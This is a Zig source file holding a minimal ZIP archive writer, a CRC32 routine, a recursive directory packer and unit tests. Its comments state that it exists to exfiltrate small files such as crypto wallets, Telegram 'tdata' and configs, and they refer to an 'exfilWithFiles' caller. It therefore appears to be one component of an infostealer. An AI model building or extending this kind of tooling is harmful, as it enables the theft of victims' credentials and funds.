const std = @import("std");

// Minimal ZIP writer (store mode, no compression)
// Produces valid ZIP archives readable by any unzip tool.
// Sufficient for exfiltrating small files (wallets, tdata, configs).

const CRC32 = struct {
    table: [256]u32,

    fn init() CRC32 {
        var t: [256]u32 = undefined;
        for (0..256) |i| {
            var c: u32 = @intCast(i);
            for (0..8) |_| {
                if (c & 1 != 0) {
                    c = 0xEDB88320 ^ (c >> 1);
                } else {
                    c >>= 1;
                }
            }
            t[i] = c;
        }
        return .{ .table = t };
    }

    fn compute(self: *const CRC32, data: []const u8) u32 {
        var crc: u32 = 0xFFFFFFFF;
        for (data) |b| {
            crc = self.table[(crc ^ b) & 0xFF] ^ (crc >> 8);
        }
        return crc ^ 0xFFFFFFFF;
    }
};

const LocalFileHeader = struct {
    signature: u32 = 0x04034b50,
    version_needed: u16 = 20,
    flags: u16 = 0,
    compression: u16 = 0, // store
    mod_time: u16 = 0,
    mod_date: u16 = 0x0021, // 1980-01-01
    crc32: u32 = 0,
    compressed_size: u32 = 0,
    uncompressed_size: u32 = 0,
    name_len: u16 = 0,
    extra_len: u16 = 0,
};

const CentralDirHeader = struct {
    signature: u32 = 0x02014b50,
    version_made: u16 = 20,
    version_needed: u16 = 20,
    flags: u16 = 0,
    compression: u16 = 0,
    mod_time: u16 = 0,
    mod_date: u16 = 0x0021,
    crc32: u32 = 0,
    compressed_size: u32 = 0,
    uncompressed_size: u32 = 0,
    name_len: u16 = 0,
    extra_len: u16 = 0,
    comment_len: u16 = 0,
    disk_start: u16 = 0,
    internal_attr: u16 = 0,
    external_attr: u32 = 0,
    local_header_offset: u32 = 0,
};

const EndOfCentralDir = struct {
    signature: u32 = 0x06054b50,
    disk_num: u16 = 0,
    central_dir_disk: u16 = 0,
    num_entries_disk: u16 = 0,
    num_entries: u16 = 0,
    central_dir_size: u32 = 0,
    central_dir_offset: u32 = 0,
    comment_len: u16 = 0,
};

const FileEntry = struct {
    name: []u8, // owned copy — the caller's name slice may be freed before finalize()
    size: u32,
    crc: u32,
    offset: u32,
};

pub const ZipWriter = struct {
    allocator: std.mem.Allocator,
    out: std.ArrayList(u8),
    entries: std.ArrayList(FileEntry),
    crc_table: CRC32,

    pub fn init(allocator: std.mem.Allocator) ZipWriter {
        return .{
            .allocator = allocator,
            .out = .empty,
            .entries = .empty,
            .crc_table = CRC32.init(),
        };
    }

    pub fn deinit(self: *ZipWriter) void {
        for (self.entries.items) |e| self.allocator.free(e.name);
        self.out.deinit(self.allocator);
        self.entries.deinit(self.allocator);
    }

    pub fn addFile(self: *ZipWriter, name: []const u8, data: []const u8) !void {
        const crc = self.crc_table.compute(data);
        const offset: u32 = @intCast(self.out.items.len);

        // Own a copy of the name: callers (addDirToZip / exfilWithFiles) free
        // their buffers before finalize() runs.
        const owned_name = try self.allocator.dupe(u8, name);
        errdefer self.allocator.free(owned_name);

        // Local file header
        var hdr: LocalFileHeader = .{};
        hdr.flags = 0x0800; // general purpose bit 11: UTF-8 filename
        hdr.crc32 = crc;
        hdr.compressed_size = @intCast(data.len);
        hdr.uncompressed_size = @intCast(data.len);
        hdr.name_len = @intCast(owned_name.len);

        try self.writeLocalHeader(&hdr, owned_name);
        try self.out.appendSlice(self.allocator, data);

        try self.entries.append(self.allocator, .{
            .name = owned_name,
            .size = @intCast(data.len),
            .crc = crc,
            .offset = offset,
        });
    }

    fn writeLocalHeader(self: *ZipWriter, hdr: *const LocalFileHeader, name: []const u8) !void {
        var buf: [30]u8 = undefined;
        std.mem.writeInt(u32, buf[0..4], hdr.signature, .little);
        std.mem.writeInt(u16, buf[4..6], hdr.version_needed, .little);
        std.mem.writeInt(u16, buf[6..8], hdr.flags, .little);
        std.mem.writeInt(u16, buf[8..10], hdr.compression, .little);
        std.mem.writeInt(u16, buf[10..12], hdr.mod_time, .little);
        std.mem.writeInt(u16, buf[12..14], hdr.mod_date, .little);
        std.mem.writeInt(u32, buf[14..18], hdr.crc32, .little);
        std.mem.writeInt(u32, buf[18..22], hdr.compressed_size, .little);
        std.mem.writeInt(u32, buf[22..26], hdr.uncompressed_size, .little);
        std.mem.writeInt(u16, buf[26..28], hdr.name_len, .little);
        std.mem.writeInt(u16, buf[28..30], hdr.extra_len, .little);
        try self.out.appendSlice(self.allocator, &buf);
        try self.out.appendSlice(self.allocator, name);
    }

    fn writeCentralHeader(self: *ZipWriter, e: *const FileEntry) !void {
        var buf: [46]u8 = undefined;
        std.mem.writeInt(u32, buf[0..4], @as(u32, 0x02014b50), .little);
        std.mem.writeInt(u16, buf[4..6], @as(u16, 20), .little);
        std.mem.writeInt(u16, buf[6..8], @as(u16, 20), .little);
        std.mem.writeInt(u16, buf[8..10], @as(u16, 0x0800), .little); // UTF-8 name
        std.mem.writeInt(u16, buf[10..12], @as(u16, 0), .little);
        std.mem.writeInt(u16, buf[12..14], @as(u16, 0), .little);
        std.mem.writeInt(u16, buf[14..16], @as(u16, 0x0021), .little);
        std.mem.writeInt(u32, buf[16..20], e.crc, .little);
        std.mem.writeInt(u32, buf[20..24], e.size, .little);
        std.mem.writeInt(u32, buf[24..28], e.size, .little);
        std.mem.writeInt(u16, buf[28..30], @as(u16, @intCast(e.name.len)), .little);
        std.mem.writeInt(u16, buf[30..32], @as(u16, 0), .little);
        std.mem.writeInt(u16, buf[32..34], @as(u16, 0), .little);
        std.mem.writeInt(u16, buf[34..36], @as(u16, 0), .little);
        std.mem.writeInt(u16, buf[36..38], @as(u16, 0), .little);
        std.mem.writeInt(u32, buf[38..42], @as(u32, 0), .little);
        std.mem.writeInt(u32, buf[42..46], e.offset, .little);
        try self.out.appendSlice(self.allocator, &buf);
        try self.out.appendSlice(self.allocator, e.name);
    }

    pub fn finalize(self: *ZipWriter) ![]u8 {
        const central_start: u32 = @intCast(self.out.items.len);

        for (self.entries.items) |*e| {
            try self.writeCentralHeader(e);
        }

        const central_size: u32 = @intCast(self.out.items.len - central_start);

        // End of central directory
        var eocd: [22]u8 = undefined;
        std.mem.writeInt(u32, eocd[0..4], @as(u32, 0x06054b50), .little);
        std.mem.writeInt(u16, eocd[4..6], @as(u16, 0), .little);
        std.mem.writeInt(u16, eocd[6..8], @as(u16, 0), .little);
        std.mem.writeInt(u16, eocd[8..10], @as(u16, @intCast(self.entries.items.len)), .little);
        std.mem.writeInt(u16, eocd[10..12], @as(u16, @intCast(self.entries.items.len)), .little);
        std.mem.writeInt(u32, eocd[12..16], central_size, .little);
        std.mem.writeInt(u32, eocd[16..20], central_start, .little);
        std.mem.writeInt(u16, eocd[20..22], @as(u16, 0), .little);
        try self.out.appendSlice(self.allocator, &eocd);

        return self.out.toOwnedSlice(self.allocator);
    }
};

// Helper: recursively add a directory to a ZipWriter
pub fn addDirToZip(
    zw: *ZipWriter,
    allocator: std.mem.Allocator,
    base_path: []const u8,
    zip_prefix: []const u8,
) !void {
    const winfs = @import("winfs.zig");

    var dir_iter = winfs.DirIter.open(base_path) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, entry.name }) catch continue;
        defer allocator.free(full_path);

        const zip_name = std.fmt.allocPrint(allocator, "{s}/{s}", .{ zip_prefix, entry.name }) catch continue;
        defer allocator.free(zip_name);

        if (entry.is_dir) {
            try addDirToZip(zw, allocator, full_path, zip_name);
        } else {
            const data = winfs.readFileAlloc(allocator, full_path, 10 * 1024 * 1024) catch continue;
            defer allocator.free(data);
            zw.addFile(zip_name, data) catch {};
        }
    }
}


// ============================================================
//  Tests (run on the host: zig test src/zipper.zig)
// ============================================================

test "crc32 known vector" {
    const table = CRC32.init();
    try std.testing.expectEqual(@as(u32, 0xCBF43926), table.compute("123456789"));
    try std.testing.expectEqual(@as(u32, 0), table.compute(""));
}

test "zip writer emits local header, central dir and EOCD" {
    var zw = ZipWriter.init(std.testing.allocator);
    defer zw.deinit();

    try zw.addFile("dir/hello.txt", "hello world");
    try zw.addFile("second.bin", "\x00\x01\x02");

    const out = try zw.finalize();
    defer std.testing.allocator.free(out);

    // Local file header signature.
    try std.testing.expectEqual(@as(u32, 0x04034b50), std.mem.readInt(u32, out[0..4], .little));
    // UTF-8 flag set.
    try std.testing.expectEqual(@as(u16, 0x0800), std.mem.readInt(u16, out[6..8], .little));

    // EOCD is the last 22 bytes and reports 2 entries.
    const eocd = out[out.len - 22 ..];
    try std.testing.expectEqual(@as(u32, 0x06054b50), std.mem.readInt(u32, eocd[0..4], .little));
    try std.testing.expectEqual(@as(u16, 2), std.mem.readInt(u16, eocd[10..12], .little));
}

test "zip writer keeps entry names after caller buffers are freed" {
    var zw = ZipWriter.init(std.testing.allocator);
    defer zw.deinit();

    const name = try std.testing.allocator.dupe(u8, "freed-name.txt");
    try zw.addFile(name, "payload");
    std.testing.allocator.free(name); // would dangle with the old implementation

    const out = try zw.finalize();
    defer std.testing.allocator.free(out);

    try std.testing.expect(std.mem.indexOf(u8, out, "freed-name.txt") != null);
}
